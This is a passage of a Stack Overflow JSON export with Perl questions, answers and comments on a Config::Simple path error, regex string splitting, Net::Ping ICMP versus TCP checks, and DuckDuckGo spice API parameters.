"comment_id": 105017406, "body": "What is in your <code>$path</code> variable? Is it absolute or relative? When you run <code>perl DatabaseSql.pm</code> and it works as expected you are in <code>lib</code> ?"}, {"owner": {"reputation": 11, "user_id": 12565269, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa33c7dab6624b74da01c11902bbc59f?s=128&d=identicon&r=PG&f=1", "display_name": "Foxssg", "link": "https://stackoverflow.com/users/12565269/foxssg"}, "edited": false, "score": 0, "creation_date": 1576845825, "post_id": 59410612, "comment_id": 105036908, "body": "I&#39;ve edited my post with ReadConf. When I run DatabaseSql.pm I&#39;m in &quot;/lib&quot; and when I run producer.pl I&#39;m in a folder before /lib .  My path is relative, I&#39;m using Cwd to obtain it ( $path=cwd;)."}, {"owner": {"reputation": 1934, "user_id": 10667839, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c9ee13d3681ace95a1c13693db607f72?s=128&d=identicon&r=PG&f=1", "display_name": "clamp", "link": "https://stackoverflow.com/users/10667839/clamp"}, "edited": false, "score": 0, "creation_date": 1577484523, "post_id": 59410612, "comment_id": 105185545, "body": "When you <code>use DatabaseSql</code> from <code>producer.pl</code> your cwd is probably above <code>lib</code> . You don\u2018t want the <code>&#47;..</code> in your path. Also check for existence of the file and add error handling to your code."}, {"owner": {"reputation": 11, "user_id": 12565269, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa33c7dab6624b74da01c11902bbc59f?s=128&d=identicon&r=PG&f=1", "display_name": "Foxssg", "link": "https://stackoverflow.com/users/12565269/foxssg"}, "reply_to_user": {"reputation": 1934, "user_id": 10667839, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c9ee13d3681ace95a1c13693db607f72?s=128&d=identicon&r=PG&f=1", "display_name": "clamp", "link": "https://stackoverflow.com/users/10667839/clamp"}, "edited": false, "score": 0, "creation_date": 1577976827, "post_id": 59410612, "comment_id": 105298485, "body": "@clamp you rule! That was the error, thank you so much. I&#39;m going to add an error handler."}, {"owner": {"reputation": 1934, "user_id": 10667839, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c9ee13d3681ace95a1c13693db607f72?s=128&d=identicon&r=PG&f=1", "display_name": "clamp", "link": "https://stackoverflow.com/users/10667839/clamp"}, "edited": false, "score": 0, "creation_date": 1577986879, "post_id": 59410612, "comment_id": 105303260, "body": "@Foxssg I should add that it is error prone to use <code>cwd()</code> to obtain the path. Your script might be called from anywhere, so <code>cwd()</code> does not always point to your scripts directory. You should use<code>$RealBin</code> from the core module <code>FindBin</code> instead. Documentation: <a href=\"https://perldoc.perl.org/FindBin.html#DESCRIPTION\" rel=\"nofollow noreferrer\">FindBin</a>"}, {"owner": {"reputation": 11, "user_id": 12565269, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa33c7dab6624b74da01c11902bbc59f?s=128&d=identicon&r=PG&f=1", "display_name": "Foxssg", "link": "https://stackoverflow.com/users/12565269/foxssg"}, "reply_to_user": {"reputation": 1934, "user_id": 10667839, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c9ee13d3681ace95a1c13693db607f72?s=128&d=identicon&r=PG&f=1", "display_name": "clamp", "link": "https://stackoverflow.com/users/10667839/clamp"}, "edited": false, "score": 0, "creation_date": 1577987758, "post_id": 59410612, "comment_id": 105303574, "body": "@clamp thanks I&#39;ll check it out now!"}], "owner": {"reputation": 11, "user_id": 12565269, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa33c7dab6624b74da01c11902bbc59f?s=128&d=identicon&r=PG&f=1", "display_name": "Foxssg", "link": "https://stackoverflow.com/users/12565269/foxssg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 106, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1576845543, "creation_date": 1576761594, "last_edit_date": 1576845543, "question_id": 59410612, "link": "https://stackoverflow.com/questions/59410612/perl-syntax-is-undefined", "title": "Perl _SYNTAX is undefined", "body": "<p>Hi I'm getting this error in Perl:</p>\n\n<pre><code>'_SYNTAX' is undefined at /usr/share/perl5/vendor_perl/Config/Simple.pm line 457.\nCompilation failed in require at producer.pl line 14.\nBEGIN failed--compilation aborted at producer.pl line 14.\n</code></pre>\n\n<p>producer.pl is the name of the file.</p>\n\n<p>At line 14 I have:</p>\n\n<pre><code>use DatabaseSql;\n</code></pre>\n\n<p>In DatabaseSql.pm, I have this code that is triggering that error:</p>\n\n<pre><code>    use ReadConf;\n    use Cwd qw(cwd);\n\n    my $config = ReadConf-&gt;new( { file =&gt; \"$path/../config/sws_snmpcollector.cfg\" } );\n    $config = $config-&gt;read_conf(); # Levanta los parametros de configuracion\n\n    my $prod_batch = $config-&gt;{producer_batch};\n    print $prod_batch; \n</code></pre>\n\n<p>But if I run : perl DatabaseSql.pm it runs fine and the number 2 appears (which is the value of producer_batch).</p>\n\n<p>Also in my producer.pl I'm running this:</p>\n\n<pre><code>    my $config = ReadConf-&gt;new( { file =&gt; \"$path/config/sws_snmpcollector.cfg\" } );\n    $config = $config-&gt;read_conf(); # Levanta los parametros de configuracion\n\n    my $producer_frec = $config-&gt;{producer_frec};\n</code></pre>\n\n<p>And it runs fine.</p>\n\n<p>I've searched for that error but I didn't succeed.\nThanks!</p>\n\n<p>EDIT:</p>\n\n<p>ReadConf.pm</p>\n\n<pre><code>package ReadConf;\n\nuse strict;\nuse warnings;\nuse Data::Dumper;\n\nuse Config::Simple;/pod/Config::Simple)\n\n## Constructor\nsub new {\n\n   my $class = shift;\n   my $params = shift;\n\n\n   my $self = {\n                                'file' =&gt; $params-&gt;{file}\n   };\n\n   bless $self,$class;\n\n   return $self;\n\n}\n</code></pre>\n\n<p>There're more code but it's too large.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1576755825, "post_id": 59408024, "comment_id": 105005305, "body": "<code>my $x = .. if ..</code> <a href=\"https://stackoverflow.com/a/11275324/223226\">stackoverflow.com/a/11275324/223226</a>"}], "answers": [{"comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1576753274, "post_id": 59408275, "comment_id": 105004120, "body": "Why <code>[\\s\\S]</code> instead of just <code>.</code>?"}, {"owner": {"reputation": 8251, "user_id": 2912665, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/XrRhd.jpg?s=128&g=1", "display_name": "CinCout", "link": "https://stackoverflow.com/users/2912665/cincout"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1576753383, "post_id": 59408275, "comment_id": 105004179, "body": "<code>.</code> won&#39;t consider <code>\\n</code>"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1576755636, "post_id": 59408275, "comment_id": 105005221, "body": "If that&#39;s important (and I&#39;m not sure it is here) then using <code>&#47;s</code> on the match operator is a better way to do that."}], "tags": [], "owner": {"reputation": 8251, "user_id": 2912665, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/XrRhd.jpg?s=128&g=1", "display_name": "CinCout", "link": "https://stackoverflow.com/users/2912665/cincout"}, "is_accepted": false, "score": 0, "last_activity_date": 1576995962, "last_edit_date": 1576995962, "creation_date": 1576752946, "answer_id": 59408275, "question_id": 59408024, "link": "https://stackoverflow.com/questions/59408024/perl-regex-to-get-data-from-line/59408275#59408275", "title": "Perl regex to get data from line", "body": "<p>Do this: </p>\n\n<p><code>(\\d+)([\\s\\S]+)</code></p>\n\n<p>Number is in the first capturing group, remaining sentence in the second.</p>\n\n<p><a href=\"https://regex101.com/r/oSVlS8/8\" rel=\"nofollow noreferrer\">Demo</a></p>\n"}, {"comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1576753249, "post_id": 59408306, "comment_id": 105004101, "body": "<code>[^\\n]*</code> is the same as <code>.*</code> (as long as you&#39;re not using <code>&#47;s</code>). And the final <code>$</code> is unnecessary as regexes are greedy by default."}, {"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1576754476, "post_id": 59408306, "comment_id": 105004722, "body": "If they matching regex line by line then we need check <code>!\\n - ([^\\n]*)$</code>"}], "tags": [], "owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "is_accepted": false, "score": 0, "last_activity_date": 1576753086, "creation_date": 1576753086, "answer_id": 59408306, "question_id": 59408024, "link": "https://stackoverflow.com/questions/59408024/perl-regex-to-get-data-from-line/59408306#59408306", "title": "Perl regex to get data from line", "body": "<p>Just try this:</p>\n\n<pre><code>my $line = \"50This is my test data;and this line is for testing.\";\n\nmy ($first, $second) = ($line=~m/(\\d+)([^\\n]*)$/g);\n\nprint \"$first\\t$second\\n\";\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 7444, "user_id": 967621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zOso6.jpg?s=128&g=1", "display_name": "Timur Shtatland", "link": "https://stackoverflow.com/users/967621/timur-shtatland"}, "edited": false, "score": 0, "creation_date": 1576758608, "post_id": 59408321, "comment_id": 105006665, "body": "Also, the variables should be named more descriptively by the OP."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 7444, "user_id": 967621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zOso6.jpg?s=128&g=1", "display_name": "Timur Shtatland", "link": "https://stackoverflow.com/users/967621/timur-shtatland"}, "edited": false, "score": 1, "creation_date": 1576764660, "post_id": 59408321, "comment_id": 105009870, "body": "@TimurShtatland: I agree completely. But as I know nothing about the data, it would be impossible for me to make that change."}, {"owner": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "edited": false, "score": 0, "creation_date": 1576913145, "post_id": 59408321, "comment_id": 105053702, "body": "@Dave Cross Thank you."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": true, "score": 4, "last_activity_date": 1576755429, "last_edit_date": 1576755429, "creation_date": 1576753159, "answer_id": 59408321, "question_id": 59408024, "link": "https://stackoverflow.com/questions/59408024/perl-regex-to-get-data-from-line/59408321#59408321", "title": "Perl regex to get data from line", "body": "<p>I think this is slightly simpler than the two solutions you already have.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse feature 'say';\n\nmy $data = '50This is my test data;and this line is for testing.';\n\nmy ($first, $second) = $data =~ /^(\\d+)(.*)/ or die \"No pattern match\";\n\nsay \"first:  $first\";\nsay \"second: $second\";\n</code></pre>\n"}], "owner": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 91, "favorite_count": 0, "accepted_answer_id": 59408321, "answer_count": 3, "score": 1, "last_activity_date": 1576995962, "creation_date": 1576752144, "last_edit_date": 1576752960, "question_id": 59408024, "link": "https://stackoverflow.com/questions/59408024/perl-regex-to-get-data-from-line", "title": "Perl regex to get data from line", "body": "<p>I have a data in scalar variable and I want to divide the data into 2 parts based on certain condition.\nData is:</p>\n\n<pre><code>50This is my test data;and this line is for testing.\n</code></pre>\n\n<p>I want this to be stored in 2 separate variables and result should be:</p>\n\n<pre><code>$first = 50\n$second = This is my test data;and this line is for testing.\n</code></pre>\n\n<p>This is what I have tried, but in single expression how to achieve this?</p>\n\n<pre><code>my $first = $1 if ($line =~ /(\\d+)This/);\nmy $second = $2 if ($line =~ /(\\d+)(\\w+)/)\n</code></pre>\n"}, {"tags": ["perl", "tcp", "connection", "port", "ping"], "answers": [{"comments": [{"owner": {"reputation": 496, "user_id": 10783877, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cU7Xh.jpg?s=128&g=1", "display_name": "BugBuddy", "link": "https://stackoverflow.com/users/10783877/bugbuddy"}, "edited": false, "score": 0, "creation_date": 1576737440, "post_id": 59403924, "comment_id": 104997163, "body": "I cannot use the ICMP ping protocol because that requires sudo (from the docs). However, your last option of using a specific TCP port looks interesting. I will try it and I will accept your answer if it works."}, {"owner": {"reputation": 496, "user_id": 10783877, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cU7Xh.jpg?s=128&g=1", "display_name": "BugBuddy", "link": "https://stackoverflow.com/users/10783877/bugbuddy"}, "edited": false, "score": 0, "creation_date": 1576737729, "post_id": 59403924, "comment_id": 104997256, "body": "Using TCP and a specific port does work. Answer accepted."}], "tags": [], "owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "is_accepted": true, "score": 6, "last_activity_date": 1576735564, "last_edit_date": 1576735564, "creation_date": 1576734625, "answer_id": 59403924, "question_id": 59403825, "link": "https://stackoverflow.com/questions/59403825/perl-how-to-check-if-a-server-is-live-using-ping/59403924#59403924", "title": "Perl - How to check if a server is live using Ping?", "body": "<pre><code>$ ping -c 3 google.com\n</code></pre>\n\n<p>This is doing an ICMP ping.</p>\n\n<pre><code>my $pinger = Net::Ping-&gt;new();\nif ($pinger-&gt;ping('google.com')) { ...\n</code></pre>\n\n<p>This is <strong>NOT</strong> doing an ICMP ping. From <a href=\"https://metacpan.org/pod/Net::Ping#DESCRIPTION\" rel=\"nofollow noreferrer\">the documentation</a>:</p>\n\n<blockquote>\n  <p>You may choose one of six different protocols to use for the ping. <strong>The \"tcp\" protocol is the default.</strong> ... With the \"tcp\" protocol the ping() method attempts to <strong>establish a connection to the remote host's echo port</strong>.</p>\n</blockquote>\n\n<p>The echo service is today almost never active or the port is blocked, so using this as endpoint will usually not work. If you would do instead an ICMP ping with Net::Ping it works as it does with the <code>ping</code> command:</p>\n\n<pre><code>my $pinger = Net::Ping-&gt;new('icmp');\nif ($pinger-&gt;ping('google.com')) { ...\n</code></pre>\n\n<p>Note that none of this is really suitable to determine if a host is up. ICMP ping is often blocked. Instead you should check if a connection to the specific service you want to use is possible:</p>\n\n<pre><code># check if a connect to TCP port 443 (https) is possible\nmy $pinger = Net::Ping-&gt;new('tcp');\n$pinger-&gt;port_number(443); \nif ($pinger-&gt;ping('google.com')) { ...\n</code></pre>\n"}], "owner": {"reputation": 496, "user_id": 10783877, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cU7Xh.jpg?s=128&g=1", "display_name": "BugBuddy", "link": "https://stackoverflow.com/users/10783877/bugbuddy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 347, "favorite_count": 0, "accepted_answer_id": 59403924, "answer_count": 1, "score": 2, "last_activity_date": 1576780687, "creation_date": 1576733956, "last_edit_date": 1576780687, "question_id": 59403825, "link": "https://stackoverflow.com/questions/59403825/perl-how-to-check-if-a-server-is-live-using-ping", "title": "Perl - How to check if a server is live using Ping?", "body": "<p>I'm using Perl 5, version 30 on Linux. I want to check if a server is alive and I am only interested if the ping call returns true or false. Here's my (non-working) code:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nuse Net::Ping;\nmy $pinger = Net::Ping-&gt;new();\nif ($pinger-&gt;ping('google.com')) {\n   print 'alive\\n';\n} else {\n   print 'dead\\n';\n}\n</code></pre>\n\n<p>The code should work (I think). But <strong>it fails (returns \"dead\") for every server, every time.</strong> It also fails if I execute as sudo: <code>sudo perl pingcheck.pl</code>. (EDIT: <strong>I cannot use sudo</strong> in practice. I tried it only for troubleshooting.)</p>\n\n<p>I do have <code>Net::Ping</code> installed:</p>\n\n<pre><code>$ cpan -l | grep Net::Ping\nNet::Ping       2.71\n</code></pre>\n\n<p>There are no error messages from Perl.</p>\n\n<p>If I do the same in bash, the ping works as expected:</p>\n\n<pre><code>$ ping -c 3 google.com\nPING google.com (64.233.178.100) 56(84) bytes of data.\n64 bytes from ol-in-f100.1e100.net (64.233.178.100): icmp_seq=1 ttl=43 time=49.8 ms\n64 bytes from ol-in-f100.1e100.net (64.233.178.100): icmp_seq=2 ttl=43 time=49.8 ms\n64 bytes from ol-in-f100.1e100.net (64.233.178.100): icmp_seq=3 ttl=43 time=50.0 ms\n\n--- google.com ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2004ms\nrtt min/avg/max/mdev = 49.754/49.846/50.011/0.116 ms\n</code></pre>\n"}, {"tags": ["perl", "duckduckgo"], "answers": [{"tags": [], "owner": {"reputation": 771, "user_id": 11064961, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1acfa4f737774807d5c21da9ac002dcc?s=128&d=identicon&r=PG&f=1", "display_name": "grobber", "link": "https://stackoverflow.com/users/11064961/grobber"}, "is_accepted": true, "score": 1, "last_activity_date": 1576724181, "creation_date": 1576724181, "answer_id": 59402724, "question_id": 59401820, "link": "https://stackoverflow.com/questions/59401820/how-do-duckduckgo-spice-ia-secondary-api-calls-get-their-parameters/59402724#59402724", "title": "how do duckduckgo spice IA secondary API calls get their parameters?", "body": "<p>I believe I see how this works now. The flow of information is still a bit murky to me, but at least I see how all of the requisite information is there. </p>\n\n<p>I'll take the <a href=\"https://github.com/duckduckgo/zeroclickinfo-spice/blob/master/lib/DDG/Spice/Cryptocurrency.pm\" rel=\"nofollow noreferrer\">cryptocurrency</a> instant answer as an example. The <code>alt_to</code> element in the perl package file at that link has a key named <code>cryptonator</code>. The <a href=\"https://github.com/duckduckgo/zeroclickinfo-spice/blob/master/share/spice/cryptocurrency/cryptocurrency.js\" rel=\"nofollow noreferrer\">corresponding <code>.js</code> file</a> constructs a matching endpoint:</p>\n\n<pre><code>var endpoint = \"/js/spice/cryptonator/\" + from + \"/\" + to;\n</code></pre>\n\n<p>Note the general shape of the \"remainder\" past <code>/js/spice/cryptonator</code>: <code>from/to</code>, where <code>from</code> and <code>to</code> will be two strings. </p>\n\n<p>Back in the <a href=\"https://github.com/duckduckgo/zeroclickinfo-spice/blob/master/lib/DDG/Spice/Cryptocurrency.pm\" rel=\"nofollow noreferrer\">perl package</a> the hash <code>alt_to-&gt;{cryptonator}</code> has a key <code>from</code> which receives, I think, this remainder <code>from/to</code>. The value corresponding to that key is a regex meant to split up that string into its two constituents:</p>\n\n<pre><code>from =&gt; '([^/]+)/([^/]*)'\n</code></pre>\n\n<p>Applied to <code>from/to</code>, that regex will return <code>$1=from</code> and <code>$2=to</code>. <em>These</em>, then, are the <code>$1</code> and <code>$2</code> that go into </p>\n\n<pre><code>to =&gt; 'https://api.cryptonator.com/api/full/$1-$2'\n</code></pre>\n\n<p>in <code>alt_to</code>. </p>\n\n<hr>\n\n<p>In short: </p>\n\n<p>The <code>to</code> field of <code>alt_to-&gt;{blah}</code> receives its numerical parameters by having the <code>from</code> regex operate on the remainder past <code>/js/spice/blah/</code> of the name of the corresponding endpoint constructed in the relevant <code>.js</code> file.  </p>\n"}], "owner": {"reputation": 771, "user_id": 11064961, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1acfa4f737774807d5c21da9ac002dcc?s=128&d=identicon&r=PG&f=1", "display_name": "grobber", "link": "https://stackoverflow.com/users/11064961/grobber"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 85, "favorite_count": 0, "accepted_answer_id": 59402724, "answer_count": 1, "score": 0, "last_activity_date": 1576724181, "creation_date": 1576715288, "question_id": 59401820, "link": "https://stackoverflow.com/questions/59401820/how-do-duckduckgo-spice-ia-secondary-api-calls-get-their-parameters", "title": "how do duckduckgo spice IA secondary API calls get their parameters?", "body": "<p>I have been looking through the spice instant answer <a href=\"https://github.com/duckduckgo/zeroclickinfo-spice\" rel=\"nofollow noreferrer\">source code</a>. Yes, I know it is in <a href=\"https://duckduckhack.com/\" rel=\"nofollow noreferrer\">maintenance mode</a>, but I am still curious. </p>\n\n<p>The <a href=\"https://github.com/duckduckgo/duckduckhack-docs/blob/master/walkthroughs/forum-lookup.md\" rel=\"nofollow noreferrer\">documentation</a> makes it fairly clear that the primary <code>spice to</code> API gets its numerical parameters <code>$1</code>, <code>$2</code>, etc. from the <code>handle</code> function. </p>\n\n<p>My question: should there be secondary API calls included with <code>spice alt_to</code> as, say, in the <a href=\"https://github.com/duckduckgo/zeroclickinfo-spice/blob/master/lib/DDG/Spice/Movie.pm\" rel=\"nofollow noreferrer\">movie spice IA</a>, where do the numerical parameters to <em>that</em> API call come from? </p>\n\n<p>Note, for instance, the <code>$1</code> in both the <code>movie_image</code> and <code>cast_image</code> secondary API calls in <code>spice alt_to</code> at the preceding link. I am asking which regex capture returns those instances of <code>$1</code>.</p>\n"}]